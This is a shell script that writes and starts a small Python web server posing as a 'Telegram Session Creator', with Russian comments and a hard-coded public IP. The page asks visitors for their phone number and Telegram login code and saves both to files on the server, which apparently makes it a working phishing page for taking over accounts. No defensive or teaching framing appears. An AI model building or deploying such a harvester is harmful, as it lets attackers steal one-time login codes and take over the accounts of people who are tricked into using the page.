cat > /root/website.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import random
import string
import os
from datetime import datetime

# Хранилище сессий
sessions = {}

def log(msg):
    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")

class WebsiteHandler(BaseHTTPRequestHandler):
    
    def do_GET(self):
        # Главная страница
        if self.path == '/' or self.path == '/index.html':
            self.send_response(200)
            self.send_header('Content-Type', 'text/html; charset=utf-8')
            self.end_headers()
            
            html = '''
            <!DOCTYPE html>
            <html>
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Telegram Session Creator</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body {
                        font-family: Arial, sans-serif;
                        background: linear-gradient(135deg, #667eea, #764ba2);
                        min-height: 100vh;
                        padding: 20px;
                    }
                    .container {
                        max-width: 500px;
                        margin: 50px auto;
                        background: white;
                        border-radius: 15px;
                        padding: 30px;
                        box-shadow: 0 10px 30px rgba(0,0,0,0.3);
                    }
                    h1 {
                        text-align: center;
                        color: #333;
                        margin-bottom: 20px;
                    }
                    .step {
                        display: none;
                    }
                    .step.active {
                        display: block;
                        animation: fadeIn 0.3s;
                    }
                    input {
                        width: 100%;
                        padding: 15px;
                        margin-bottom: 15px;
                        border: 2px solid #ddd;
                        border-radius: 10px;
                        font-size: 16px;
                    }
                    button {
                        width: 100%;
                        padding: 16px;
                        background: #4285f4;
                        color: white;
                        border: none;
                        border-radius: 10px;
                        font-size: 16px;
                        font-weight: bold;
                        cursor: pointer;
                    }
                    button:hover {
                        background: #3367d6;
                    }
                    .message {
                        padding: 12px;
                        border-radius: 8px;
                        margin-bottom: 15px;
                        display: none;
                    }
                    .success {
                        background: #d4edda;
                        color: #155724;
                        border: 1px solid #c3e6cb;
                    }
                    .error {
                        background: #f8d7da;
                        color: #721c24;
                        border: 1px solid #f5c6cb;
                    }
                    .info {
                        background: #d1ecf1;
                        color: #0c5460;
                        border: 1px solid #bee5eb;
                    }
                    @keyframes fadeIn {
                        from { opacity: 0; transform: translateY(10px); }
                        to { opacity: 1; transform: translateY(0); }
                    }
                    .loader {
                        display: none;
                        text-align: center;
                        margin: 15px 0;
                    }
                    .dot {
                        display: inline-block;
                        width: 10px;
                        height: 10px;
                        margin: 0 3px;
                        background: #4285f4;
                        border-radius: 50%;
                        animation: bounce 1.4s infinite ease-in-out both;
                    }
                    .dot:nth-child(1) { animation-delay: -0.32s; }
                    .dot:nth-child(2) { animation-delay: -0.16s; }
                    @keyframes bounce {
                        0%, 80%, 100% { transform: scale(0); }
                        40% { transform: scale(1.0); }
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1>🔐 Create Telegram Session</h1>
                    
                    <div class="message info" id="infoMsg">
                        Enter your phone number to receive Telegram code
                    </div>
                    
                    <div class="message success" id="successMsg"></div>
                    <div class="message error" id="errorMsg"></div>
                    
                    <!-- Шаг 1: Номер телефона -->
                    <div class="step active" id="step1">
                        <input type="tel" id="phone" placeholder="79123456789" maxlength="15" autofocus>
                        <button onclick="sendPhone()">Send Code</button>
                    </div>
                    
                    <!-- Шаг 2: Код -->
                    <div class="step" id="step2">
                        <input type="text" id="code" placeholder="12345" maxlength="6">
                        <button onclick="sendCode()">Create Session</button>
                    </div>
                    
                    <!-- Шаг 3: Готово -->
                    <div class="step" id="step3">
                        <div class="message success">
                            <h3>✅ Session Created!</h3>
                            <p>Check server logs for session file</p>
                        </div>
                    </div>
                    
                    <div class="loader" id="loader">
                        <div class="dot"></div>
                        <div class="dot"></div>
                        <div class="dot"></div>
                    </div>
                </div>
                
                <script>
                    let sessionId = '';
                    
                    function showStep(step) {
                        document.querySelectorAll('.step').forEach(el => {
                            el.classList.remove('active');
                        });
                        document.getElementById('step' + step).classList.add('active');
                    }
                    
                    function showMessage(type, text) {
                        const types = ['info', 'success', 'error'];
                        types.forEach(t => {
                            const el = document.getElementById(t + 'Msg');
                            el.style.display = 'none';
                            el.textContent = '';
                        });
                        
                        const el = document.getElementById(type + 'Msg');
                        if (el) {
                            el.style.display = 'block';
                            el.textContent = text;
                        }
                    }
                    
                    function showLoading(show) {
                        document.getElementById('loader').style.display = show ? 'block' : 'none';
                    }
                    
                    async function sendPhone() {
                        let phone = document.getElementById('phone').value.replace(/[^\d]/g, '');
                        
                        if (phone.length < 11) {
                            showMessage('error', 'Enter valid phone number');
                            return;
                        }
                        
                        if (!phone.startsWith('7') && !phone.startsWith('8')) {
                            phone = '7' + phone;
                        }
                        
                        showLoading(true);
                        showMessage('info', 'Sending code to Telegram...');
                        
                        try {
                            const response = await fetch('/api/start', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({phone: phone})
                            });
                            
                            const data = await response.json();
                            
                            if (data.status === 'success') {
                                sessionId = data.session_id;
                                showStep(2);
                                showMessage('success', 'Code sent! Check Telegram.');
                                document.getElementById('code').focus();
                            } else {
                                showMessage('error', data.message || 'Error');
                            }
                        } catch (error) {
                            showMessage('error', 'Network error');
                        } finally {
                            showLoading(false);
                        }
                    }
                    
                    async function sendCode() {
                        const code = document.getElementById('code').value.trim();
                        
                        if (code.length < 5) {
                            showMessage('error', 'Enter code from Telegram');
                            return;
                        }
                        
                        showLoading(true);
                        showMessage('info', 'Creating session...');
                        
                        try {
                            const response = await fetch('/api/code', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({
                                    session_id: sessionId,
                                    code: code
                                })
                            });
                            
                            const data = await response.json();
                            
                            if (data.status === 'success') {
                                showStep(3);
                                showMessage('success', 'Session created successfully!');
                            } else {
                                showMessage('error', data.message || 'Wrong code');
                                showStep(1);
                            }
                        } catch (error) {
                            showMessage('error', 'Network error');
                        } finally {
                            showLoading(false);
                        }
                    }
                    
                    // Enter key support
                    document.getElementById('phone').addEventListener('keypress', (e) => {
                        if (e.key === 'Enter') sendPhone();
                    });
                    
                    document.getElementById('code').addEventListener('keypress', (e) => {
                        if (e.key === 'Enter') sendCode();
                    });
                    
                    // Auto-format phone
                    document.getElementById('phone').addEventListener('input', (e) => {
                        let value = e.target.value.replace(/\D/g, '');
                        if (value.length > 0 && !value.startsWith('7') && !value.startsWith('8')) {
                            value = '7' + value;
                        }
                        e.target.value = value;
                    });
                </script>
            </body>
            </html>
            '''
            self.wfile.write(html.encode())
            
        # Страница статуса
        elif self.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.end_headers()
            
            response = {
                "status": "online",
                "server": "Telegram Session Creator",
                "time": datetime.now().isoformat(),
                "sessions_active": len(sessions),
                "endpoints": {
                    "POST /api/start": "Start auth",
                    "POST /api/code": "Verify code",
                    "GET /": "Website",
                    "GET /status": "Server status"
                }
            }
            self.wfile.write(json.dumps(response, indent=2).encode())
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_POST(self):
        # CORS headers
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        
        # Читаем тело запроса
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except:
            data = {}
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        
        # /api/start - начало авторизации
        if self.path == '/api/start':
            phone = data.get('phone', '')
            phone = ''.join([c for c in phone if c.isdigit()])
            
            if len(phone) < 11:
                response = {"status": "error", "message": "Invalid phone number"}
                self.wfile.write(json.dumps(response).encode())
                log(f"Auth start FAIL: {phone}")
                return
            
            # Генерируем сессию
            session_id = ''.join(random.choices(string.digits, k=10))
            sessions[session_id] = {
                'phone': phone,
                'time': datetime.now().isoformat()
            }
            
            response = {
                "status": "success",
                "session_id": session_id,
                "message": f"Code sent to {phone} (demo mode)"
            }
            
            self.wfile.write(json.dumps(response).encode())
            log(f"Auth start: {phone} -> {session_id}")
        
        # /api/code - проверка кода
        elif self.path == '/api/code':
            session_id = data.get('session_id', '')
            code = data.get('code', '')
            
            if session_id not in sessions:
                response = {"status": "error", "message": "Invalid session"}
                self.wfile.write(json.dumps(response).encode())
                log(f"Code verify FAIL: {session_id}")
                return
            
            phone = sessions[session_id]['phone']
            
            # Сохраняем сессию в файл
            os.makedirs('/root/sessions', exist_ok=True)
            filename = f'/root/sessions/session_{session_id}.txt'
            
            with open(filename, 'w') as f:
                f.write(f"Phone: {phone}\n")
                f.write(f"Code: {code}\n")
                f.write(f"Time: {datetime.now()}\n")
                f.write(f"Session ID: {session_id}\n")
            
            # Очищаем
            del sessions[session_id]
            
            response = {
                "status": "success",
                "message": "Session created successfully",
                "file": filename,
                "phone": phone
            }
            
            self.wfile.write(json.dumps(response).encode())
            log(f"Code verify SUCCESS: {phone} -> {filename}")
        
        else:
            response = {"status": "error", "message": "Not found"}
            self.wfile.write(json.dumps(response).encode())
    
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def log_message(self, format, *args):
        pass

def run_website():
    port = 8080  # Другой порт для сайта
    
    server = HTTPServer(('0.0.0.0', port), WebsiteHandler)
    
    log("="*50)
    log(f"Website starting on port {port}")
    log(f"URL: http://188.225.11.61:{port}")
    log("="*50)
    log("Endpoints:")
    log("  GET  /           - Main website")
    log("  GET  /status     - Server status")
    log("  POST /api/start  - Start auth")
    log("  POST /api/code   - Verify code")
    log("="*50)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log("Website stopped")

if __name__ == '__main__':
    run_website()
EOF

# Даем права
chmod +x /root/website.py

# Запускаем сайт
screen -S website -dm python3 /root/website.py

# Проверяем
sleep 2
curl -s http://188.225.11.61:8080 | grep -o "<title>[^<]*" | cut -d'>' -f2
